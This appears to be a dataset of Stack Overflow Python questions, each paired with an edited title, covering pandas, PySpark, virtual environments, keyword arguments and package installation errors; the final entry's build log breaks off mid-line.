Python: Replace duplicate items from list while keeping the first occurrence," I have a list lst = [1,1,1,2,2,2,2,3,3,3,3,3,4,4,4,4,4,4,4,4,4]I'm expecting the following output: I want to keep the first occurrence of the item and replace all other occurrences of the same item with empty strings.I tried the following approach. But I'm looking for some simpler or better approaches. <code>  out = [1,"""","""",2,"""","""","""",3,"""","""","""","""",4,"""","""","""","""","""","""","""",""""] `def splrep(lst): from collections import Counter C = Counter(lst) flst = [ [k,]*v for k,v in C.items()] nl = [] for i in flst: nl1 = [] for j,k in enumerate(i): nl1.append(j) nl.append(nl1) ng = list(zip(flst, nl)) for i,j in ng: j.pop(0) for i,j in ng: for k in j: i[k] = '' final = [i for [i,j] in ng] fin = [i for j in final for i in j] return fin`",Replace duplicate items from list while keeping the first occurrence
conditional ffill in pandas dataframe," I have a dataframe df with float values in column A. I want to add another column B such that:B[0] = A[0]for i > 0...B[i] = if(np.isnan(A[i])) then A[i] else Step3B[i] = if(abs((B[i-1] - A[i]) / B[i-1]) < 0.3) then B[i-1] else A[i]Sample dataframe df can be generated as given below <code>  import numpy as npimport pandas as pddf = pd.DataFrame(1000*(2+np.random.randn(500, 1)), columns=list('A'))df.loc[1, 'A'] = np.nandf.loc[15, 'A'] = np.nandf.loc[240, 'A'] = np.nandf.loc[241, 'A'] = np.nan",conditional fill in pandas dataframe
How to create a dictionary of two lists with different lengths," I have two lists different lengths, L1 and L2. L1 is longer than L2. I would like to get a dictionary with members of L1 as keys and members of L2 as values.As soon as all the members of L2 are used up. I would like to start over and begin again with L2[0]. As expected, the output is this: What I would like to achieve is the following: <code>  L1 = ['A', 'B', 'C', 'D', 'E'] L2 = ['1', '2', '3'] D = dict(zip(L1, L2)) print(D) {'A': '1', 'B': '2', 'C': '3'} {'A': '1', 'B': '2', 'C': '3', 'D': '1', 'E': '2'}",Create a dictionary by zipping together two lists of uneven length
How to setup virtual environment for Python in VS Code?," In my project folder I created a venv folder: When I run command select python interpreter in Visual Studio Code, my venv folder is not shown. I went one level up like suggested here, but Visual Studio Code doesn't see my virtual interpreter.What did I miss? <code>  python -m venv venv",How can I set up a virtual environment for Python in Visual Studio Code?
Flask/Python: 'function' object has no attribute X," app.py defines a sectors view that use a Sectors class defined in sectors.py. When I access the view, I get an AttributeError: I imported sectors, so it should be a module, not a function, and it does have Sectors defined. Why isn't this working? <code>  sector = sectors.Sectors()AttributeError: 'function' object has no attribute 'Sectors' import sectors@app.route(""/sectors"")def sectors(): sector = sectors.Sectors() return render_template('sectors.html', sector=sector) ","Flask view raises ""AttributeError: 'function' object has no attribute"""
How does the global namespace work in Python?," I've been using Python for a good period of time. I have never found out how built-in functions work. In different words, how are they included without having any module imported to use them? What if I want to add to them (locally)? This may seem naive. But, I haven't really found any answer that explains comprehensively how do we have built-in functions, global variables, etc., available to us when developing a script.In a nutshell, where do we include the builtins module?I have encountered this question. But it gives a partial answer to my question. <code> ",How are the contents of the builtins module available in the global namespace without import in Python?
pd.read_df throws 'cannot set WRITABLE flag to True of this array'," When runningpd.read_hdf('myfile.h5')I get the following traceback error: [[...some longer traceback]] ~/.local/lib/python3.6/site-packages/pandas/io/pytables.py in read_array(self, key, start, stop) 2487 2488 if isinstance(node, tables.VLArray): -> 2489 ret = node[0][start:stop] 2490 else: 2491 dtype = getattr(attrs, 'value_type', None) ~/.local/lib/python3.6/site-packages/tables/vlarray.py in getitem(self, key) ~/.local/lib/python3.6/site-packages/tables/vlarray.py in read(self, start, stop, step) tables/hdf5extension.pyx in tables.hdf5extension.VLArray._read_array() ValueError: cannot set WRITEABLE flag to True of this arrayNo clue what's going on. I've tried reinstalling tables, pandas everything basically, but doesn't want to read it. <code> ",pd.read_hdf throws 'cannot set WRITABLE flag to True of this array'
PySpark 2.4 (via pip) + Local Mode + Virtualenv: Exception when trying to connect to Kafka," The following is my PySpark startup snippet, which is pretty reliable (I've been using it a long time). Today I added the two Maven Coordinates shown in the spark.jars.packages option (effectively ""plugging"" in Kafka support). Now that normally triggers dependency downloads (performed by Spark automatically): However the plugins aren't downloading and/or loading when I run the snippet (e.g. ./python -i init_spark.py), as they should.This mechanism used to work, but then stopped. What am I missing?Thank you in advance! <code>  import sys, os, multiprocessingfrom pyspark.sql import DataFrame, DataFrameStatFunctions, DataFrameNaFunctionsfrom pyspark.conf import SparkConffrom pyspark.sql import SparkSessionfrom pyspark.sql import functions as sFnfrom pyspark.sql.types import *from pyspark.sql.types import Row # ------------------------------------------ # Note: Row() in .../pyspark/sql/types.py # isn't included in '__all__' list(), so # we must import it by name here. # ------------------------------------------ num_cpus = multiprocessing.cpu_count() # Number of CPUs for SPARK Local mode.os.environ.pop('SPARK_MASTER_HOST', None) # Since we're using pip/pySpark these three ENVsos.environ.pop('SPARK_MASTER_POST', None) # aren't needed; and we ensure pySpark doesn'tos.environ.pop('SPARK_HOME', None) # get confused by them, should they be set.os.environ.pop('PYTHONSTARTUP', None) # Just in case pySpark 2.x attempts to read this.os.environ['PYSPARK_PYTHON'] = sys.executable # Make SPARK Workers use same Python as Master.os.environ['JAVA_HOME'] = '/usr/lib/jvm/jre' # Oracle JAVA for our pip/python3/pySpark 2.4 (CDH's JRE won't work).JARS_IVY_REPO = '/home/jdoe/SPARK.JARS.REPO.d/'# ======================================================================# Maven Coordinates for JARs (and their dependencies) needed to plug# extra functionality into Spark 2.x (e.g. Kafka SQL and Streaming)# A one-time internet connection is necessary for Spark to autimatically# download JARs specified by the coordinates (and dependencies).# ======================================================================spark_jars_packages = ','.join(['org.apache.spark:spark-streaming-kafka-0-10_2.11:2.4.0', 'org.apache.spark:spark-sql-kafka-0-10_2.11:2.4.0',])# ======================================================================spark_conf = SparkConf()spark_conf.setAll([('spark.master', 'local[{}]'.format(num_cpus)), ('spark.app.name', 'myApp'), ('spark.submit.deployMode', 'client'), ('spark.ui.showConsoleProgress', 'true'), ('spark.eventLog.enabled', 'false'), ('spark.logConf', 'false'), ('spark.jars.repositories', 'file:/' + JARS_IVY_REPO), ('spark.jars.ivy', JARS_IVY_REPO), ('spark.jars.packages', spark_jars_packages), ])spark_sesn = SparkSession.builder.config(conf = spark_conf).getOrCreate()spark_ctxt = spark_sesn.sparkContextspark_reader = spark_sesn.readspark_streamReader = spark_sesn.readStreamspark_ctxt.setLogLevel(""WARN"")",PySpark 2.x: Programmatically adding Maven JAR Coordinates to Spark
PySpark 2.4 could not initialize org.apache.spark.sql.kafka010.KafkaSourceProvider," The following is my PySpark startup snippet, which is pretty reliable (I've been using it a long time). Today I added the two Maven Coordinates shown in the spark.jars.packages option (effectively ""plugging"" in Kafka support). Now that normally triggers dependency downloads (performed by Spark automatically): However the plugins aren't downloading and/or loading when I run the snippet (e.g. ./python -i init_spark.py), as they should.This mechanism used to work, but then stopped. What am I missing?Thank you in advance! <code>  import sys, os, multiprocessingfrom pyspark.sql import DataFrame, DataFrameStatFunctions, DataFrameNaFunctionsfrom pyspark.conf import SparkConffrom pyspark.sql import SparkSessionfrom pyspark.sql import functions as sFnfrom pyspark.sql.types import *from pyspark.sql.types import Row # ------------------------------------------ # Note: Row() in .../pyspark/sql/types.py # isn't included in '__all__' list(), so # we must import it by name here. # ------------------------------------------ num_cpus = multiprocessing.cpu_count() # Number of CPUs for SPARK Local mode.os.environ.pop('SPARK_MASTER_HOST', None) # Since we're using pip/pySpark these three ENVsos.environ.pop('SPARK_MASTER_POST', None) # aren't needed; and we ensure pySpark doesn'tos.environ.pop('SPARK_HOME', None) # get confused by them, should they be set.os.environ.pop('PYTHONSTARTUP', None) # Just in case pySpark 2.x attempts to read this.os.environ['PYSPARK_PYTHON'] = sys.executable # Make SPARK Workers use same Python as Master.os.environ['JAVA_HOME'] = '/usr/lib/jvm/jre' # Oracle JAVA for our pip/python3/pySpark 2.4 (CDH's JRE won't work).JARS_IVY_REPO = '/home/jdoe/SPARK.JARS.REPO.d/'# ======================================================================# Maven Coordinates for JARs (and their dependencies) needed to plug# extra functionality into Spark 2.x (e.g. Kafka SQL and Streaming)# A one-time internet connection is necessary for Spark to autimatically# download JARs specified by the coordinates (and dependencies).# ======================================================================spark_jars_packages = ','.join(['org.apache.spark:spark-streaming-kafka-0-10_2.11:2.4.0', 'org.apache.spark:spark-sql-kafka-0-10_2.11:2.4.0',])# ======================================================================spark_conf = SparkConf()spark_conf.setAll([('spark.master', 'local[{}]'.format(num_cpus)), ('spark.app.name', 'myApp'), ('spark.submit.deployMode', 'client'), ('spark.ui.showConsoleProgress', 'true'), ('spark.eventLog.enabled', 'false'), ('spark.logConf', 'false'), ('spark.jars.repositories', 'file:/' + JARS_IVY_REPO), ('spark.jars.ivy', JARS_IVY_REPO), ('spark.jars.packages', spark_jars_packages), ])spark_sesn = SparkSession.builder.config(conf = spark_conf).getOrCreate()spark_ctxt = spark_sesn.sparkContextspark_reader = spark_sesn.readspark_streamReader = spark_sesn.readStreamspark_ctxt.setLogLevel(""WARN"")",PySpark 2.x: Programmatically adding Maven JAR Coordinates to Spark
PySpark 2.4: Programmatically adding Maven Coordinates is not working," The following is my PySpark startup snippet, which is pretty reliable (I've been using it a long time). Today I added the two Maven Coordinates shown in the spark.jars.packages option (effectively ""plugging"" in Kafka support). Now that normally triggers dependency downloads (performed by Spark automatically): However the plugins aren't downloading and/or loading when I run the snippet (e.g. ./python -i init_spark.py), as they should.This mechanism used to work, but then stopped. What am I missing?Thank you in advance! <code>  import sys, os, multiprocessingfrom pyspark.sql import DataFrame, DataFrameStatFunctions, DataFrameNaFunctionsfrom pyspark.conf import SparkConffrom pyspark.sql import SparkSessionfrom pyspark.sql import functions as sFnfrom pyspark.sql.types import *from pyspark.sql.types import Row # ------------------------------------------ # Note: Row() in .../pyspark/sql/types.py # isn't included in '__all__' list(), so # we must import it by name here. # ------------------------------------------ num_cpus = multiprocessing.cpu_count() # Number of CPUs for SPARK Local mode.os.environ.pop('SPARK_MASTER_HOST', None) # Since we're using pip/pySpark these three ENVsos.environ.pop('SPARK_MASTER_POST', None) # aren't needed; and we ensure pySpark doesn'tos.environ.pop('SPARK_HOME', None) # get confused by them, should they be set.os.environ.pop('PYTHONSTARTUP', None) # Just in case pySpark 2.x attempts to read this.os.environ['PYSPARK_PYTHON'] = sys.executable # Make SPARK Workers use same Python as Master.os.environ['JAVA_HOME'] = '/usr/lib/jvm/jre' # Oracle JAVA for our pip/python3/pySpark 2.4 (CDH's JRE won't work).JARS_IVY_REPO = '/home/jdoe/SPARK.JARS.REPO.d/'# ======================================================================# Maven Coordinates for JARs (and their dependencies) needed to plug# extra functionality into Spark 2.x (e.g. Kafka SQL and Streaming)# A one-time internet connection is necessary for Spark to autimatically# download JARs specified by the coordinates (and dependencies).# ======================================================================spark_jars_packages = ','.join(['org.apache.spark:spark-streaming-kafka-0-10_2.11:2.4.0', 'org.apache.spark:spark-sql-kafka-0-10_2.11:2.4.0',])# ======================================================================spark_conf = SparkConf()spark_conf.setAll([('spark.master', 'local[{}]'.format(num_cpus)), ('spark.app.name', 'myApp'), ('spark.submit.deployMode', 'client'), ('spark.ui.showConsoleProgress', 'true'), ('spark.eventLog.enabled', 'false'), ('spark.logConf', 'false'), ('spark.jars.repositories', 'file:/' + JARS_IVY_REPO), ('spark.jars.ivy', JARS_IVY_REPO), ('spark.jars.packages', spark_jars_packages), ])spark_sesn = SparkSession.builder.config(conf = spark_conf).getOrCreate()spark_ctxt = spark_sesn.sparkContextspark_reader = spark_sesn.readspark_streamReader = spark_sesn.readStreamspark_ctxt.setLogLevel(""WARN"")",PySpark 2.x: Programmatically adding Maven JAR Coordinates to Spark
PySpark 2.4: Programmatically adding Maven JAR Coordinates stopped working," The following is my PySpark startup snippet, which is pretty reliable (I've been using it a long time). Today I added the two Maven Coordinates shown in the spark.jars.packages option (effectively ""plugging"" in Kafka support). Now that normally triggers dependency downloads (performed by Spark automatically): However the plugins aren't downloading and/or loading when I run the snippet (e.g. ./python -i init_spark.py), as they should.This mechanism used to work, but then stopped. What am I missing?Thank you in advance! <code>  import sys, os, multiprocessingfrom pyspark.sql import DataFrame, DataFrameStatFunctions, DataFrameNaFunctionsfrom pyspark.conf import SparkConffrom pyspark.sql import SparkSessionfrom pyspark.sql import functions as sFnfrom pyspark.sql.types import *from pyspark.sql.types import Row # ------------------------------------------ # Note: Row() in .../pyspark/sql/types.py # isn't included in '__all__' list(), so # we must import it by name here. # ------------------------------------------ num_cpus = multiprocessing.cpu_count() # Number of CPUs for SPARK Local mode.os.environ.pop('SPARK_MASTER_HOST', None) # Since we're using pip/pySpark these three ENVsos.environ.pop('SPARK_MASTER_POST', None) # aren't needed; and we ensure pySpark doesn'tos.environ.pop('SPARK_HOME', None) # get confused by them, should they be set.os.environ.pop('PYTHONSTARTUP', None) # Just in case pySpark 2.x attempts to read this.os.environ['PYSPARK_PYTHON'] = sys.executable # Make SPARK Workers use same Python as Master.os.environ['JAVA_HOME'] = '/usr/lib/jvm/jre' # Oracle JAVA for our pip/python3/pySpark 2.4 (CDH's JRE won't work).JARS_IVY_REPO = '/home/jdoe/SPARK.JARS.REPO.d/'# ======================================================================# Maven Coordinates for JARs (and their dependencies) needed to plug# extra functionality into Spark 2.x (e.g. Kafka SQL and Streaming)# A one-time internet connection is necessary for Spark to autimatically# download JARs specified by the coordinates (and dependencies).# ======================================================================spark_jars_packages = ','.join(['org.apache.spark:spark-streaming-kafka-0-10_2.11:2.4.0', 'org.apache.spark:spark-sql-kafka-0-10_2.11:2.4.0',])# ======================================================================spark_conf = SparkConf()spark_conf.setAll([('spark.master', 'local[{}]'.format(num_cpus)), ('spark.app.name', 'myApp'), ('spark.submit.deployMode', 'client'), ('spark.ui.showConsoleProgress', 'true'), ('spark.eventLog.enabled', 'false'), ('spark.logConf', 'false'), ('spark.jars.repositories', 'file:/' + JARS_IVY_REPO), ('spark.jars.ivy', JARS_IVY_REPO), ('spark.jars.packages', spark_jars_packages), ])spark_sesn = SparkSession.builder.config(conf = spark_conf).getOrCreate()spark_ctxt = spark_sesn.sparkContextspark_reader = spark_sesn.readspark_streamReader = spark_sesn.readStreamspark_ctxt.setLogLevel(""WARN"")",PySpark 2.x: Programmatically adding Maven JAR Coordinates to Spark
How to create a python function with parameters which take no keyword arguments?," A lot of inbuilt functions in python don't take keyword arguments. For example, the chr function. Trying to pass values to chr using keyword arguments don't work. I know that the / character in the help text of the chr function means that it won't take keyword arguments.How can I define a function that does not take keyword arguments? And of course, I want to define a function that takes arguments, but only positional arguments.This will probably be marked as a duplicate but at least that way I'll get the answer. I can't find a StackOverflow answer for this question.Another similar feature I learnt is to create a function that does not take positional arguments. This question is similar to mine, but it doesn't actually answer my question. I still don't know how to define a function that will not accept keyword arguments, like several of the built-in functions. <code>  >>> help(chr)Help on built-in function chr in module builtins:chr(i, /) Return a Unicode string of one character with ordinal i; 0 <= i <= 0x10ffff. >>> chr(i=65)Traceback (most recent call last):File ""<stdin>"", line 1, in <module>TypeError: chr() takes no keyword arguments >>> def f(*, a, b):... print(a, b)...>>> f(1, 2)Traceback (most recent call last): File ""<stdin>"", line 1, in <module>TypeError: f() takes 0 positional arguments but 2 were given>>> f(a=1, b=2)1 2",How to create a python function which take only positional arguments and no keyword arguments?
Joining two list column values like zip in Pyspark," I have a Pandas dataframe. I have tried to join two columns containing string values into a list first and then using zip, I joined each element of the list with '_'. My data set is like below: I wanted to join these two columns in a third column like below for each row of my dataframe. I have successfully done so in python using the code below but the dataframe is quite large and it takes a very long time to run it for the whole dataframe. I want to do the same thing in PySpark for efficiency. I have read the data in spark dataframe successfully but I'm having a hard time determining how to replicate Pandas functions with PySpark equivalent functions. How can I get my desired result in PySpark? I have converted the two columns to arrays in PySpark by using the below code Now all I need is to zip each element of the arrays in the two columns using '_'. How can I use zip with this? Any help is appreciated. <code>  df['column_1']: 'abc, def, ghi'df['column_2']: '1.0, 2.0, 3.0' df['column_3']: [abc_1.0, def_2.0, ghi_3.0] df['column_3'] = df['column_2']for index, row in df.iterrows(): while index < 3: if isinstance(row['column_1'], str): row['column_1'] = list(row['column_1'].split(',')) row['column_2'] = list(row['column_2'].split(',')) row['column_3'] = ['_'.join(map(str, i)) for i in zip(list(row['column_1']), list(row['column_2']))] from pyspark.sql.types import ArrayType, IntegerType, StringTypefrom pyspark.sql.functions import col, splitcrash.withColumn(""column_1"", split(col(""column_1""), "",\s*"").cast(ArrayType(StringType())).alias(""column_1""))crash.withColumn(""column_2"", split(col(""column_2""), "",\s*"").cast(ArrayType(StringType())).alias(""column_2""))",How to zip two array columns in Spark SQL
Activate venv (Python 3.7.2) for windows," I can't activate the venv on my new project (new to Python too),If I do python --version: Python 3.7.2I created the venv using ' $ python -m venv ./venv ' in my editor (vs code).and now to activate is where I have a problem,Attempt 1: My user name is formatted from 2 names ""name & name"" with space between them! Is that a problem? It just show first name and not the second.Attempt 2: <code>  $ ./venv/Scripts/activate.baterror : 'C:\Users\name' is not recognized as an internal or external command, operable program or batch file.The system cannot find the path specified. $ C:\Users/name & name/Desktop/ProjectFolder/venv/Scripts/activate.baterror: [1] 15160bash: C:Users/name: No such file or directorybash: name/Desktop/ProjectFolder/venv/Scripts/activate.bat: No such file or directory[1]+ Exit 127 C:\Users/name",Activate venv (Python 3.7.2) for Windows
"In Python, how can I access attributes that have the same name as reserved keywords?"," I am calling an API that is returning an AttributeDict that has a number of attributes, such as to and from.To access these attributes, I am using dot notation. For example, I use object.to and that works fine.When I try to use object.from, I get an error that says SyntaxError: invalid syntax. I assume this is because from is a keyword in Python. If this is the case, is it possible to access from with a dot? For now, I am using object[""from""], which is working, but does not match the rest of my code. <code> ",how can I access attributes that have the same name as reserved keywords?
Unable to get result using pandas.extract," When using regular expression, I get: In pandas, I write: How to solve the problem?Thanks. <code>  import restring = r'http://www.example.com/abc.html'result = re.search('^.*com', string).group() df = pd.DataFrame(columns = ['index', 'url'])df.loc[len(df), :] = [1, 'http://www.example.com/abc.html']df.loc[len(df), :] = [2, 'http://www.hello.com/def.html']df.str.extract('^.*com')ValueError: pattern contains no capture groups",pandas ValueError: pattern contains no capture groups
Python Feather Install," I'm fairly new to Python and I'm trying to download the feather library but I am getting an error. I have already updated pip and setuptools but I am still getting errors. This is the output I get from PyCharm: =====================Update per Chris Hunt's Response==========================I am actually receiving conflicting feedback as to whether I have installed feather-format. I receive this output from my anaconda command prompt: Additionally, when I try to install feather-format on pycharm, I receive this error: So it looks like I simply need to update my interpreter to 64 bits? <code>  Collecting featherUsing cached https://files.pythonhosted.org/packages/77/d1/073c848713d9987f48d0bc8415646760a069ef3ca80e9b45fdb6b4422133/feather-0.9.1dev.tar.gzComplete output from command python setup.py egg_info:Downloading http://pypi.python.org/packages/source/d/distribute/distribute-0.6.14.tar.gzTraceback (most recent call last):File ""C:\Users\NICKAL~1\AppData\Local\Temp\pycharm-packaging\feather\distribute_setup.py"", line 143, in use_setuptoolsraise ImportErrorImportErrorDuring handling of the above exception, another exception occurred:Traceback (most recent call last): File ""<string>"", line 1, in <module> File ""C:\Users\NICKAL~1\AppData\Local\Temp\pycharm-packaging\feather\setup.py"", line 3, in <module> distribute_setup.use_setuptools() File ""C:\Users\NICKAL~1\AppData\Local\Temp\pycharm-packaging\feather\distribute_setup.py"", line 145, in use_setuptools return _do_download(version, download_base, to_dir, download_delay) File ""C:\Users\NICKAL~1\AppData\Local\Temp\pycharm-packaging\feather\distribute_setup.py"", line 124, in _do_download to_dir, download_delay) File ""C:\Users\NICKAL~1\AppData\Local\Temp\pycharm-packaging\feather\distribute_setup.py"", line 193, in download_setuptools src = urlopen(url) File ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\urllib\request.py"", line 223, in urlopen return opener.open(url, data, timeout) File ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\urllib\request.py"", line 532, in open response = meth(req, response) File ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\urllib\request.py"", line 642, in http_response 'http', request, response, code, msg, hdrs) File ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\urllib\request.py"", line 570, in error return self._call_chain(*args) File ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\urllib\request.py"", line 504, in _call_chain result = func(*args) File ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\urllib\request.py"", line 650, in http_error_default raise HTTPError(req.full_url, code, msg, hdrs, fp)urllib.error.HTTPError: HTTP Error 403: SSL is required----------------------------------------Command ""python setup.py egg_info"" failed with error code 1 in C:\Users\NICKAL~1\AppData\Local\Temp\pycharm-packaging\feather\ (base) C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32>pip install feather-formatRequirement already satisfied: feather-format in c:\users\nick alexander\anaconda3\lib\site-packages (0.4.0)Requirement already satisfied: pyarrow>=0.4.0 in c:\users\nick alexander\anaconda3\lib\site-packages (from feather-format) (0.12.0a0)Requirement already satisfied: numpy>=1.14 in c:\users\nick alexander\anaconda3\lib\site-packages (from pyarrow>=0.4.0->feather-format) (1.15.4)Requirement already satisfied: six>=1.0.0 in c:\users\nick alexander\anaconda3\lib\site-packages (from pyarrow>=0.4.0->feather-format) (1.11.0) Collecting feather-format Downloading https://files.pythonhosted.org/packages/08/55/940b97cc6f19a19f5dab9efef2f68a0ce43a7632f858b272391f0b851a7e/feather-format-0.4.0.tar.gzCollecting pyarrow>=0.4.0 (from feather-format) Downloading https://files.pythonhosted.org/packages/1d/b6/c4e63f8bdb175d2223df26ddf12e2a0ba3fa347890128b5f128cb3f72589/pyarrow-0.11.0.tar.gz (602kB) Installing build dependencies: started Installing build dependencies: finished with status 'done' Getting requirements to build wheel: started Getting requirements to build wheel: finished with status 'done' Preparing wheel metadata: started Preparing wheel metadata: finished with status 'done'Requirement already satisfied: six>=1.0.0 in c:\users\nick alexander\appdata\local\programs\python\python36-32\lib\site-packages (from pyarrow>=0.4.0->feather-format) (1.11.0)Requirement already satisfied: numpy>=1.14 in c:\users\nick alexander\appdata\local\programs\python\python36-32\lib\site-packages (from pyarrow>=0.4.0->feather-format) (1.15.2)Building wheels for collected packages: pyarrow Building wheel for pyarrow (PEP 517): started Building wheel for pyarrow (PEP 517): finished with status 'error' Complete output from command ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\python.exe"" ""C:\Users\Nick Alexander\AppData\Local\Programs\Python\Python36-32\lib\site-packages\pip\_vendor\pep517\_in_process.py"" build_wheel C:\Users\NICKAL~1\AppData\Local\Temp\tmpnf9ink_0: C:\Users\NICKAL~1\AppData\Local\Temp\pip-build-env-quyk7sl2\overlay\Lib\site-packages\setuptools_scm\utils.py:118: UserWarning: 'git' was not found warnings.warn(""%r was not found"" % name) running bdist_wheel running build running build_py creating build creating build\lib.win32-3.6 creating build\lib.win32-3.6\pyarrow copying pyarrow\benchmark.py -> build\lib.win32-3.6\pyarrow copying pyarrow\compat.py -> build\lib.win32-3.6\pyarrow copying pyarrow\csv.py -> build\lib.win32-3.6\pyarrow copying pyarrow\cuda.py -> build\lib.win32-3.6\pyarrow copying pyarrow\feather.py -> build\lib.win32-3.6\pyarrow copying pyarrow\filesystem.py -> build\lib.win32-3.6\pyarrow copying pyarrow\formatting.py -> build\lib.win32-3.6\pyarrow copying pyarrow\hdfs.py -> build\lib.win32-3.6\pyarrow copying pyarrow\ipc.py -> build\lib.win32-3.6\pyarrow copying pyarrow\jvm.py -> build\lib.win32-3.6\pyarrow copying pyarrow\orc.py -> build\lib.win32-3.6\pyarrow copying pyarrow\pandas_compat.py -> build\lib.win32-3.6\pyarrow copying pyarrow\parquet.py -> build\lib.win32-3.6\pyarrow copying pyarrow\plasma.py -> build\lib.win32-3.6\pyarrow copying pyarrow\serialization.py -> build\lib.win32-3.6\pyarrow copying pyarrow\types.py -> build\lib.win32-3.6\pyarrow copying pyarrow\util.py -> build\lib.win32-3.6\pyarrow copying pyarrow\_generated_version.py -> build\lib.win32-3.6\pyarrow copying pyarrow\__init__.py -> build\lib.win32-3.6\pyarrow creating build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\conftest.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\deserialize_buffer.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\pandas_examples.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_array.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_builder.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_convert_builtin.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_convert_pandas.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_csv.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_cuda.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_cython.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_deprecations.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_feather.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_hdfs.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_io.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_ipc.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_jvm.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_misc.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_orc.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_parquet.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_plasma.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_plasma_tf_op.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_scalars.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_schema.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_serialization.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_table.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_tensor.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\test_types.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\util.py -> build\lib.win32-3.6\pyarrow\tests copying pyarrow\tests\__init__.py -> build\lib.win32-3.6\pyarrow\tests running egg_info writing pyarrow.egg-info\PKG-INFO writing dependency_links to pyarrow.egg-info\dependency_links.txt writing entry points to pyarrow.egg-info\entry_points.txt writing requirements to pyarrow.egg-info\requires.txt writing top-level names to pyarrow.egg-info\top_level.txt reading manifest file 'pyarrow.egg-info\SOURCES.txt' reading manifest template 'MANIFEST.in' warning: no previously-included files matching '*.so' found anywhere in distribution warning: no previously-included files matching '*.pyc' found anywhere in distribution warning: no previously-included files matching '*~' found anywhere in distribution warning: no previously-included files matching '#*' found anywhere in distribution warning: no previously-included files matching '.git*' found anywhere in distribution warning: no previously-included files matching '.DS_Store' found anywhere in distribution no previously-included directories found matching '.asv' writing manifest file 'pyarrow.egg-info\SOURCES.txt' copying pyarrow\__init__.pxd -> build\lib.win32-3.6\pyarrow copying pyarrow\_csv.pyx -> build\lib.win32-3.6\pyarrow copying pyarrow\_cuda.pxd -> build\lib.win32-3.6\pyarrow copying pyarrow\_cuda.pyx -> build\lib.win32-3.6\pyarrow copying pyarrow\_orc.pxd -> build\lib.win32-3.6\pyarrow copying pyarrow\_orc.pyx -> build\lib.win32-3.6\pyarrow copying pyarrow\_parquet.pxd -> build\lib.win32-3.6\pyarrow copying pyarrow\_parquet.pyx -> build\lib.win32-3.6\pyarrow copying pyarrow\_plasma.pyx -> build\lib.win32-3.6\pyarrow copying pyarrow\array.pxi -> build\lib.win32-3.6\pyarrow copying pyarrow\benchmark.pxi -> build\lib.win32-3.6\pyarrow copying pyarrow\builder.pxi -> build\lib.win32-3.6\pyarrow copying pyarrow\error.pxi -> build\lib.win32-3.6\pyarrow copying pyarrow\feather.pxi -> build\lib.win32-3.6\pyarrow copying pyarrow\io-hdfs.pxi -> build\lib.win32-3.6\pyarrow copying pyarrow\io.pxi -> build\lib.win32-3.6\pyarrow copying pyarrow\ipc.pxi -> build\lib.win32-3.6\pyarrow copying pyarrow\lib.pxd -> build\lib.win32-3.6\pyarrow copying pyarrow\lib.pyx -> build\lib.win32-3.6\pyarrow copying pyarrow\lib_api.h -> build\lib.win32-3.6\pyarrow copying pyarrow\memory.pxi -> build\lib.win32-3.6\pyarrow copying pyarrow\plasma_store -> build\lib.win32-3.6\pyarrow copying pyarrow\public-api.pxi -> build\lib.win32-3.6\pyarrow copying pyarrow\scalar.pxi -> build\lib.win32-3.6\pyarrow copying pyarrow\serialization.pxi -> build\lib.win32-3.6\pyarrow copying pyarrow\table.pxi -> build\lib.win32-3.6\pyarrow copying pyarrow\types.pxi -> build\lib.win32-3.6\pyarrow creating build\lib.win32-3.6\pyarrow\include creating build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\allocator.h -> build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\api.h -> build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\array.h -> build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\buffer.h -> build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\builder.h -> build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\compare.h -> build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\memory_pool.h -> build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\pretty_print.h -> build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\record_batch.h -> build\lib.win32-3.6\pyarrow\include\arrow copying pyarrow\include\arrow\status.h -> 